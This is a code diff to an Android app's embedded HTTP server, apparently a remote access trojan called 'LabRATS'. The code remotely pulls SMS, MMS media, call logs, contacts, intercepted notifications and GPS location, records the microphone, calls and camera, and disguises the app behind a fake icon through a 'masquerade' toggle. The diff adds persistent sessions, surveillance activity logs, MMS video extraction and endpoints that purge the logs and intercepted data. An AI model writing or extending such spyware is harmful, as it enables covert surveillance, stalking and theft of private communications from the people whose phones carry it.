@@ -3,6 +3,7 @@ package com.labs.labrats;
 import android.Manifest;
 import android.content.Context;
 import android.content.Intent;
+import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.hardware.camera2.CameraManager;
@@ -39,11 +40,56 @@ public class LabRatsHttpServer extends NanoHTTPD {
 
     private final Context context;
     private static final List<String> systemLogs = new java.util.concurrent.CopyOnWriteArrayList<>();
+    private static boolean logsLoaded = false;
+    private static Context staticContext;
 
-    private static void logActivity(String msg) {
+    public static void logActivity(String msg) {
         String timestamp = new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date());
         systemLogs.add(0, "[" + timestamp + "] " + msg);
-        if (systemLogs.size() > 50) systemLogs.remove(systemLogs.size() - 1);
+        while (systemLogs.size() > 50) systemLogs.remove(systemLogs.size() - 1);
+        saveLogsInternal();
+    }
+
+    private void loadPersistentData() {
+        SharedPreferences prefs = context.getSharedPreferences("LabRATSSettings", Context.MODE_PRIVATE);
+        
+        // 1. Persist Session Token
+        String savedToken = prefs.getString("session_token", "");
+        if (savedToken.isEmpty()) {
+            this.sessionToken = java.util.UUID.randomUUID().toString();
+            prefs.edit().putString("session_token", this.sessionToken).apply();
+        } else {
+            this.sessionToken = savedToken;
+        }
+
+        // 2. Load System Logs
+        if (!logsLoaded) {
+            String logsJson = prefs.getString("system_logs", "[]");
+            try {
+                org.json.JSONArray array = new org.json.JSONArray(logsJson);
+                systemLogs.clear();
+                for (int i = 0; i < array.length(); i++) {
+                    systemLogs.add(array.getString(i));
+                }
+                logsLoaded = true;
+            } catch (Exception e) {
+                Log.e("LabRATS", "Log Load Error: " + e.getMessage());
+            }
+        }
+    }
+
+    private static synchronized void saveLogsInternal() {
+        if (staticContext == null) return;
+        try {
+            org.json.JSONArray array = new org.json.JSONArray();
+            for (String log : systemLogs) {
+                array.put(log);
+            }
+            staticContext.getSharedPreferences("LabRATSSettings", Context.MODE_PRIVATE)
+                .edit().putString("system_logs", array.toString()).apply();
+        } catch (Exception e) {
+            Log.e("LabRATS", "Log Save Error: " + e.getMessage());
+        }
     }
 
     private static final String HTML_HEADER = "<!DOCTYPE html>" +
@@ -298,8 +344,8 @@ public class LabRatsHttpServer extends NanoHTTPD {
     public LabRatsHttpServer(Context context, int port) {
         super(port);
         this.context = context;
-        // Generate a random token on start
-        this.sessionToken = java.util.UUID.randomUUID().toString();
+        staticContext = context.getApplicationContext();
+        loadPersistentData();
     }
 
     @Override
@@ -346,8 +392,8 @@ public class LabRatsHttpServer extends NanoHTTPD {
                 return serveMmsMessages(params);
             } else if (uri.equals("/mms/send")) {
                 return sendMms(session);
-            } else if (uri.startsWith("/mms/image/")) {
-                return serveMmsImage(uri.substring(11));
+            } else if (uri.startsWith("/mms/media/")) {
+                return serveMmsMedia(uri.substring(11));
             } else if (uri.equals("/sms/send")) {
                 return sendSms(params);
             } else if (uri.equals("/contacts")) {
@@ -374,18 +420,25 @@ public class LabRatsHttpServer extends NanoHTTPD {
                 return stopVideoRecording();
             } else if (uri.equals("/camera/status")) {
                 return serveCameraStatus();
+            } else if (uri.equals("/terminal/clear-logs")) {
+                systemLogs.clear();
+                saveLogsInternal(); // Clear persistent logs too
+                logActivity("SYSTEM_MAINTENANCE: Session logs cleared");
+                return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
             } else if (uri.equals("/camera/screen-frame")) {
                 return serveScreenFrame();
             } else if (uri.equals("/camera/screen-start")) {
                 return startScreenProjection();
-            } else if (uri.equals("/camera/flash")) {
-                return triggerFlash();
             } else if (uri.equals("/gps")) {
                 return serveGpsPage();
             } else if (uri.equals("/gps/locate")) {
                 return serveGpsLocate(params);
             } else if (uri.equals("/intel")) {
                 return serveIntel();
+            } else if (uri.equals("/intel/clear")) {
+                NotificationSniffer.clearHistory(context);
+                logActivity("SYSTEM_MAINTENANCE: Intel history purged");
+                return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
             } else if (uri.startsWith("/files/edit/")) {
                 return serveFileEdit(uri.substring(12));
             } else if (uri.equals("/files/save")) {
@@ -415,6 +468,11 @@ public class LabRatsHttpServer extends NanoHTTPD {
             } else if (uri.equals("/audio/recordings")) {
                 return serveAudioRecordings();
             } else if (uri.equals("/logout")) {
+                // Invalidate session token on device to force new login on all devices
+                context.getSharedPreferences("LabRATSSettings", Context.MODE_PRIVATE)
+                    .edit().remove("session_token").apply();
+                this.sessionToken = java.util.UUID.randomUUID().toString(); // Randomize current instance too
+
                 Response r = newFixedLengthResponse(Response.Status.REDIRECT, "text/html", "");
                 r.addHeader("Location", "/login");
                 r.addHeader("Set-Cookie", "token=logged_out; Path=/; Max-Age=0; HttpOnly");
@@ -453,7 +511,12 @@ public class LabRatsHttpServer extends NanoHTTPD {
         
         // Status Monitor Card
         html.append("<div class=\"card\">");
-        html.append("<h2 style=\"margin-bottom: 25px;\">SYSTEM_MONITOR v1.3.2</h2>");
+        html.append("<div style=\"display:flex; justify-content:space-between; align-items:center; margin-bottom: 25px;\">");
+        html.append("<h2 style=\"margin-bottom:0;\">SYSTEM_MONITOR v1.3.2</h2>");
+        String snifferStatus = NotificationSniffer.isServiceRunning() ? 
+            "<span style=\"color:var(--neon-green); font-size:0.7rem; font-family:monospace;\">&#9679; INTEL_ACTIVE</span>" : 
+            "<span style=\"color:var(--danger); font-size:0.7rem; font-family:monospace;\">&#9675; INTEL_DISCONNECTED</span>";
+        html.append(snifferStatus).append("</div>");
         html.append("<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px;\">");
         
         // Server Status
@@ -491,9 +554,18 @@ public class LabRatsHttpServer extends NanoHTTPD {
         }
         
         html.append("</div>");
-        html.append("<div style=\"margin-top: 15px; text-align: right;\">");
+        html.append("<div style=\"margin-top: 15px; text-align: right; display: flex; justify-content: space-between; align-items: center;\">");
+        html.append("<span style=\"font-size: 0.65rem; color: #888;\">AUTO_REFRESH_ACTIVE</span>");
+        html.append("<div style=\"display: flex; gap: 10px;\">");
+        html.append("<button onclick=\"clearLogs()\" class=\"btn\" style=\"font-size: 0.65rem; padding: 6px 15px; border-color: var(--danger); color: var(--danger); background: rgba(255, 49, 49, 0.05);\">CLEAR_LOGS</button>");
         html.append("<button onclick=\"location.reload()\" class=\"btn\" style=\"font-size: 0.65rem; padding: 6px 15px; border-color: rgba(0, 242, 255, 0.3);\">REFRESH_LOGS</button>");
         html.append("</div>");
+        html.append("</div>");
+        html.append("<script>");
+        html.append("  function clearLogs() { if(confirm('Clear all session logs?')) fetch('/terminal/clear-logs').then(() => location.reload()); }");
+        html.append("  // Auto-refresh Terminal page every 5 seconds to keep logs live");
+        html.append("  setTimeout(function() { if(!window.manualInterruption) location.reload(); }, 5000);");
+        html.append("</script>");
         html.append("</div>");
 
         // Security Settings Card
@@ -517,6 +589,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
     }
 
     private Response serveDeviceInfo() {
+        logActivity("SYSTEM_EXTRACT: Device hardware and network analytics retrieved");
         StringBuilder html = new StringBuilder(HTML_HEADER);
         html.append("<div class=\"card\">");
         html.append("<h2 style=\"margin-bottom: 20px;\">Device Information</h2>");
@@ -683,6 +756,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
     }
 
     private Response serveCallLogs(Map<String, String> params) {
+        logActivity("COMMS_EXTRACT: Call history retrieved");
         StringBuilder html = new StringBuilder(HTML_HEADER);
         html.append("<div class=\"back-btn-container\">");
         html.append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>");
@@ -885,6 +959,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
     }
 
     private Response serveContacts(Map<String, String> params) {
+        logActivity("CONTACT_EXTRACT: Address book retrieved");
         StringBuilder html = new StringBuilder(HTML_HEADER);
         html.append("<div class=\"back-btn-container\">");
         html.append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>");
@@ -1063,62 +1138,6 @@ public class LabRatsHttpServer extends NanoHTTPD {
         return newFixedLengthResponse(Response.Status.INTERNAL_ERROR, "text/html", html);
     }
 
-    private Response triggerFlash() {
-        try {
-            // Check if CameraService is using the camera
-            if (CameraService.isCurrentlyStreaming() || CameraService.isCurrentlyRecording()) {
-                return serveError("Flash unavailable while camera is in use (streaming/recording).");
-            }
-
-            CameraManager camManager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
-            String backCameraId = null;
-            
-            for (String id : camManager.getCameraIdList()) {
-                try {
-                    android.hardware.camera2.CameraCharacteristics characteristics = camManager.getCameraCharacteristics(id);
-                    Integer facing = characteristics.get(android.hardware.camera2.CameraCharacteristics.LENS_FACING);
-                    if (facing != null && facing == android.hardware.camera2.CameraCharacteristics.LENS_FACING_BACK) {
-                        backCameraId = id;
-                        break;
-                    }
-                } catch (Exception e) {
-                    Log.e("Lab-RATS", "Error checking camera " + id, e);
-                }
-            }
-
-            if (backCameraId == null && camManager.getCameraIdList().length > 0) {
-                backCameraId = camManager.getCameraIdList()[0];
-            }
-
-            if (backCameraId != null) {
-                final String finalId = backCameraId;
-                new Thread(() -> {
-                    try {
-                        CameraManager manager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
-                        for (int i = 0; i < 3; i++) {
-                            try {
-                                manager.setTorchMode(finalId, true);
-                                Thread.sleep(300);
-                                manager.setTorchMode(finalId, false);
-                                Thread.sleep(300);
-                            } catch (android.hardware.camera2.CameraAccessException e) {
-                                // If camera is in use (e.g. streaming), torch mode might fail
-                                Log.e("Lab-RATS", "Flash access error: " + e.getMessage());
-                                break;
-                            }
-                        }
-                    } catch (Exception e) {
-                        Log.e("Lab-RATS", "Flash error: " + e.getMessage());
-                    }
-                }).start();
-                return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true, \"message\": \"Flash command dispatched\"}");
-            } else {
-                return serveError("No camera with flash found.");
-            }
-        } catch (Exception e) {
-            return serveError("Flash error: " + e.getMessage());
-        }
-    }
 
     private Response serveGpsPage() {
         StringBuilder html = new StringBuilder(HTML_HEADER);
@@ -1195,6 +1214,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
     }
 
     private Response serveGpsLocate(Map<String, String> params) {
+        logActivity("LOCATE_TRIGGER: Precision GPS uplink initiated");
         boolean hasFineLocation = ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED;
         boolean hasCoarseLocation = ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED;
 
@@ -1383,7 +1403,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
         html.append("<div class=\"card\">");
         html.append("<h2 style=\"display:flex; align-items:center; gap:15px; margin-bottom:20px;\">")
             .append("<span style=\"color:var(--neon-cyan);\">&#128247;</span> OPTICS_TERMINAL")
-            .append("<span id=\"night-mode-status\" style=\"margin-left:auto; font-size:0.7rem; color:").append(CameraService.isNightModeEnabled() ? "var(--neon-green)" : "var(--neon-red)").append("; font-family:monospace;\">NIGHT_MODE: ").append(CameraService.isNightModeEnabled() ? "ACTIVE" : "OFF").append("</span>")
+            .append("<span id=\"night-mode-status\" style=\"margin-left:auto; font-size:0.7rem; color:").append(CameraService.isNightModeEnabled(context) ? "var(--neon-green)" : "var(--neon-red)").append("; font-family:monospace;\">NIGHT_MODE: ").append(CameraService.isNightModeEnabled(context) ? "ACTIVE" : "OFF").append("</span>")
             .append("</h2>");
 
         html.append("<div style=\"padding:15px; margin-bottom:20px; display:flex; justify-content:center; align-items:center; border:1px solid rgba(255,255,0,0.1); border-radius:12px; background:rgba(255,255,0,0.02);\">")
@@ -1836,8 +1856,6 @@ public class LabRatsHttpServer extends NanoHTTPD {
         // Action buttons
         html.append("<div style=\"display: flex; gap: 10px; justify-content: center; flex-wrap: wrap;\">");
         html.append(
-                "<button onclick=\"triggerFlash()\" style=\"padding: 12px 24px; background: rgba(255, 255, 0, 0.2); border: 1px solid #ffff00; border-radius: 10px; color: #ffff00; font-weight: 600; cursor: pointer;\">&#9889; Blink Flash</button>");
-        html.append(
                 "<button onclick=\"rotateStream()\" style=\"padding: 12px 24px; background: rgba(243, 156, 18, 0.2); border: 1px solid #f39c12; border-radius: 10px; color: #f39c12; font-weight: 600; cursor: pointer;\">&#8635; Rotate 90&deg;</button>");
         html.append(
                 "<button onclick=\"capturePhoto()\" style=\"padding: 12px 24px; background: linear-gradient(135deg, #3498db, #2980b9); border: none; border-radius: 10px; color: #fff; font-weight: 600; cursor: pointer;\">&#128247; Capture Photo</button>");
@@ -1874,12 +1892,6 @@ public class LabRatsHttpServer extends NanoHTTPD {
         html.append("  streamImg.style.transform = 'rotate(' + currentRotation + 'deg)';");
         html.append("}");
 
-        html.append("function triggerFlash() {");
-        html.append("  fetch('/camera/flash').then(r => r.json()).then(d => {");
-        html.append("    document.getElementById('status').innerHTML = d.message;");
-        html.append("    setTimeout(() => { document.getElementById('status').innerHTML = ''; }, 3000);");
-        html.append("  });");
-        html.append("}");
 
         // Start streaming with current resolution
         html.append("function startStream() {");
@@ -2075,6 +2087,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
 
     private Response startVideoRecording(Map<String, String> params) {
         String camId = params.get("cam");
+        logActivity("OPTICS_UPLINK: Background video recording started on camera " + (camId != null ? camId : "0"));
         String widthStr = params.get("width");
         String heightStr = params.get("height");
 
@@ -2105,6 +2118,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
     }
 
     private Response stopVideoRecording() {
+        logActivity("OPTICS_TERMINATED: Background recording saved");
         android.content.Intent intent = new android.content.Intent(context, CameraService.class);
         intent.setAction("STOP_RECORDING");
         context.startService(intent);
@@ -2311,6 +2325,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
     }
 
     private Response startMicRecording(Map<String, String> params) {
+        logActivity("ACOUSTICS_UPLINK: Microphone surveillance started");
         int duration = 0;
         if (params.containsKey("duration")) {
             try {
@@ -2339,6 +2354,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
     }
 
     private Response stopMicRecording() {
+        logActivity("ACOUSTICS_TERMINATED: Audio capture ended");
         android.content.Intent intent = new android.content.Intent(context, CallRecordService.class);
         intent.setAction("STOP_MIC_RECORDING");
         context.startService(intent);
@@ -2351,6 +2367,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
     }
 
     private Response startCallRecording(Map<String, String> params) {
+        logActivity("ACOUSTICS_UPLINK: Remote call recording initiated");
         String phoneNumber = params.get("number");
         String callType = params.get("type");
 
@@ -2370,6 +2387,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
     }
 
     private Response stopCallRecording() {
+        logActivity("ACOUSTICS_TERMINATED: Call recording ended");
         android.content.Intent intent = new android.content.Intent(context, CallRecordService.class);
         intent.setAction("STOP_CALL_RECORDING");
         context.startService(intent);
@@ -2406,6 +2424,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
     }
 
     private Response updateAudioSettings(Map<String, String> params) {
+        logActivity("ACOUSTICS_PROTOCOL: Surveillance settings updated");
         boolean autoRecord = "true".equalsIgnoreCase(params.get("auto_record"));
         boolean saveOnDevice = "true".equalsIgnoreCase(params.get("save_on_device"));
 
@@ -2427,6 +2446,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
     }
 
     private Response serveAudioRecordings() {
+        logActivity("ACOUSTICS_EXTRACT: Remote audio archive accessed");
         StringBuilder html = new StringBuilder(HTML_HEADER);
         html.append("<div class=\"back-btn-container\">");
         html.append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>");
@@ -2509,12 +2529,14 @@ public class LabRatsHttpServer extends NanoHTTPD {
     }
 
     private Response serveSmsMessages(Map<String, String> params) {
+        logActivity("COMMS_EXTRACT: SMS history retrieved");
         StringBuilder html = new StringBuilder(HTML_HEADER);
         html.append("<div class=\"back-btn-container\">");
         html.append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>");
         html.append("</div>");
         html.append("<div class=\"card\">");
         html.append("<h2 style=\"margin-bottom: 20px;\">&#128233; SMS Terminal</h2>");
+        html.append("<p style=\"color: #888; font-size: 0.8rem; margin-bottom: 20px;\"><b>Note:</b> RCS and Advanced Messaging (Blue Bubbles) are intercepted in real-time in the <a href=\"/intel\" style=\"color: var(--neon-cyan);\">Intel Tab</a>.</p>");
         html.append("<div style=\"background: rgba(0, 242, 255, 0.05); padding: 20px; border: 1px solid var(--neon-cyan); border-radius: 8px; margin-bottom: 30px;\">");
         html.append("<h3 style=\"font-size: 1rem; margin-bottom: 15px;\">&#128231; Send New Message</h3>");
         html.append("<form action=\"/sms/send\" method=\"get\">");
@@ -2596,6 +2618,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
     }
 
     private Response serveMmsMessages(Map<String, String> params) {
+        logActivity("COMMS_EXTRACT: MMS media database retrieved");
         StringBuilder html = new StringBuilder(HTML_HEADER);
         html.append("<div class=\"back-btn-container\">");
         html.append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>");
@@ -2627,14 +2650,14 @@ public class LabRatsHttpServer extends NanoHTTPD {
         int offset = (page - 1) * limit;
         Cursor cursor = null;
         try {
-            Set<String> mmsWithImages = getMmsIdsWithImages();
+            Set<String> mmsWithMedia = getMmsIdsWithMedia();
             Uri mmsUri = Uri.parse("content://mms/");
             cursor = context.getContentResolver().query(mmsUri, new String[]{"_id", "date", "msg_box"}, null, null, "date DESC");
             if (cursor != null && cursor.getCount() > 0) {
                 List<String[]> mmsList = new ArrayList<>();
                 while (cursor.moveToNext()) {
                     String mmsId = cursor.getString(0);
-                    if (mmsWithImages.contains(mmsId)) {
+                    if (mmsWithMedia.contains(mmsId)) {
                         mmsList.add(new String[]{
                             mmsId, 
                             String.valueOf(cursor.getLong(1) * 1000), 
@@ -2661,8 +2684,13 @@ public class LabRatsHttpServer extends NanoHTTPD {
                     for (String part : parts) {
                         if (part.startsWith("text:")) html.append("<div style=\"margin-bottom:5px;\">").append(escapeHtml(part.substring(5))).append("</div>");
                         else if (part.startsWith("image:")) {
-                            html.append("<img src=\"/mms/image/").append(part.substring(6))
+                            html.append("<img src=\"/mms/media/").append(part.substring(6))
                                 .append("\" style=\"max-width: 150px; border: 1px solid var(--neon-cyan); margin-top:5px; border-radius:4px; cursor:zoom-in;\" onclick=\"window.open(this.src)\">");
+                        } else if (part.startsWith("video:")) {
+                            html.append("<div style=\"margin-top:10px;\"><video controls style=\"max-width: 250px; border: 1px solid var(--neon-green); border-radius:4px;\">")
+                                .append("<source src=\"/mms/media/").append(part.substring(6)).append("\" type=\"video/mp4\">")
+                                .append("Your browser does not support the video tag.")
+                                .append("</video></div>");
                         }
                     }
                     html.append("</td><td>").append(formatMessageDate(date)).append("</td></tr>");
@@ -2740,6 +2768,8 @@ public class LabRatsHttpServer extends NanoHTTPD {
                     if (body != null) parts.add("text:" + body);
                 } else if (type != null && type.startsWith("image/") && partId != null) {
                     parts.add("image:" + partId);
+                } else if (type != null && type.startsWith("video/") && partId != null) {
+                    parts.add("video:" + partId);
                 }
             }
             c.close();
@@ -2747,11 +2777,11 @@ public class LabRatsHttpServer extends NanoHTTPD {
         return parts;
     }
 
-    private Set<String> getMmsIdsWithImages() {
+    private Set<String> getMmsIdsWithMedia() {
         Set<String> ids = new HashSet<>();
         try {
             Uri partUri = Uri.parse("content://mms/part");
-            Cursor c = context.getContentResolver().query(partUri, new String[]{"mid"}, "ct LIKE 'image/%'", null, null);
+            Cursor c = context.getContentResolver().query(partUri, new String[]{"mid"}, "ct LIKE 'image/%' OR ct LIKE 'video/%'", null, null);
             if (c != null) {
                 int midIdx = c.getColumnIndex("mid");
                 while (c.moveToNext()) {
@@ -2822,19 +2852,19 @@ public class LabRatsHttpServer extends NanoHTTPD {
         return sb.toString();
     }
 
-    private Response serveMmsImage(String partId) {
+    private Response serveMmsMedia(String partId) {
         try {
             Uri uri = Uri.parse("content://mms/part/" + partId);
             InputStream is = context.getContentResolver().openInputStream(uri);
             if (is == null) return serve404();
-            String mimeType = "image/jpeg";
+            String mimeType = "application/octet-stream";
             Cursor c = context.getContentResolver().query(uri, new String[]{"ct"}, null, null, null);
             if (c != null) {
                 if (c.moveToFirst()) mimeType = c.getString(0);
                 c.close();
             }
             return newFixedLengthResponse(Response.Status.OK, mimeType, is, is.available());
-        } catch (Exception e) { return serveError("Failed to load image: " + e.getMessage()); }
+        } catch (Exception e) { return serveError("Failed to load media: " + e.getMessage()); }
     }
 
     private Response sendSms(Map<String, String> params) {
@@ -2861,6 +2891,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
             Map<String, String> params = session.getParms();
 
             String number = params.get("number");
+            logActivity("COMMS_DISPATCH: MMS package sent to " + (number != null ? number : "unknown"));
             String message = params.get("message");
             String tempFilePath = files.get("media");
 
@@ -2889,11 +2920,17 @@ public class LabRatsHttpServer extends NanoHTTPD {
     }
 
     private Response serveIntel() {
+        logActivity("INTEL_UPLINK: Notification stream accessed");
         StringBuilder html = new StringBuilder(HTML_HEADER);
-        html.append("<h2 style=\"display:flex; align-items:center; gap:15px;\">")
+        html.append("<h2 style=\"display:flex; align-items:center; gap:15px; margin-bottom:20px;\">")
             .append("<span style=\"color:var(--neon-cyan);\">&#9889;</span> INTEL_STREAM")
-            .append("<span style=\"margin-left:auto; font-size:0.7rem; opacity:0.5; font-family:monospace;\">NOTIFICATION_LISTENER_ACTIVE</span>")
-            .append("</h2>");
+            .append("<div style=\"margin-left:auto; display:flex; align-items:center; gap:15px;\">")
+            .append("<button onclick=\"clearIntel()\" class=\"btn\" style=\"font-size: 0.65rem; padding: 6px 15px; border-color: var(--danger); color: var(--danger); background: rgba(255, 49, 49, 0.05);\">CLEAR_STREAM</button>")
+            .append("<button onclick=\"location.reload()\" class=\"btn\" style=\"font-size: 0.65rem; padding: 6px 15px; border-color: var(--neon-cyan); color: var(--neon-cyan); background: rgba(0, 242, 255, 0.05);\">RELOAD_STREAM</button>")
+            .append("<span style=\"font-size:0.7rem; opacity:0.5; font-family:monospace;\">NOTIFICATION_LISTENER_ACTIVE</span>")
+            .append("</div></h2>");
+        
+        html.append("<script>function clearIntel() { if(confirm('Purge all intercepted intel?')) fetch('/intel/clear').then(() => location.reload()); }</script>");
 
         html.append("<div class=\"card\">");
         List<NotificationSniffer.NotificationData> notifications = NotificationSniffer.getHistory();
@@ -2925,6 +2962,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
 
     private Response serveFileEdit(String path) {
         path = path.replace("%20", " ");
+        logActivity("DATA_ACCESS: File editor opened - " + path);
         File file = new File(Environment.getExternalStorageDirectory(), path);
         if (!file.exists() || !file.isFile()) return serve404();
 
@@ -2972,6 +3010,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
             
             try (java.io.FileOutputStream fos = new java.io.FileOutputStream(file)) {
                 fos.write(content.getBytes());
+                logActivity("DATA_MODIFIED: File saved - " + path);
             }
             
             String html = HTML_HEADER + "<div class=\"card\"><div class=\"empty-state\"><div class=\"icon\" style=\"color:var(--neon-green);\">&#10004;</div><h2>Data Synchronized</h2><p>Changes deployed successfully to storage.</p><a href=\"/files/edit/" + escapeHtml(path) + "\" class=\"btn\">Back to Editor</a></div></div>" + HTML_FOOTER;
@@ -2982,13 +3021,21 @@ public class LabRatsHttpServer extends NanoHTTPD {
     }
 
     private Response toggleNightMode() {
+        boolean current = CameraService.isNightModeEnabled(context);
+        boolean newValue = !current;
+        
+        // Save to prefs directly from here
+        context.getSharedPreferences("LabRATSSettings", Context.MODE_PRIVATE)
+                .edit().putBoolean("night_mode", newValue).apply();
+        
+        logActivity("OPTICS_PROTOCOL: Night Vision " + (newValue ? "ENABLED" : "DISABLED"));
+        
         CameraService service = CameraService.getInstance();
         if (service != null) {
-            boolean current = CameraService.isNightModeEnabled();
-            service.setNightMode(!current);
-            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"status\": \"success\", \"nightMode\": " + !current + "}");
+            service.setNightMode(newValue);
         }
-        return serveError("Camera Service Inactive");
+        
+        return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"status\": \"success\", \"nightMode\": " + newValue + "}");
     }
 
     private Response toggleStealthMode() {
@@ -3001,11 +3048,13 @@ public class LabRatsHttpServer extends NanoHTTPD {
             
             if (mainState != android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
                 // Switch to Fake Icon
+                logActivity("STEALTH_EXECUTION: Masquerade Mode ENABLED");
                 pm.setComponentEnabledSetting(mainAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
                 pm.setComponentEnabledSetting(fakeAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, android.content.pm.PackageManager.DONT_KILL_APP);
                 return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"status\": \"success\", \"mode\": \"masquerade\", \"hidden\": true}");
             } else {
                 // Restore Main Icon
+                logActivity("STEALTH_EXECUTION: Masquerade Mode DISABLED");
                 pm.setComponentEnabledSetting(fakeAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
                 pm.setComponentEnabledSetting(mainAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, android.content.pm.PackageManager.DONT_KILL_APP);
                 return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"status\": \"success\", \"mode\": \"normal\", \"hidden\": false}");
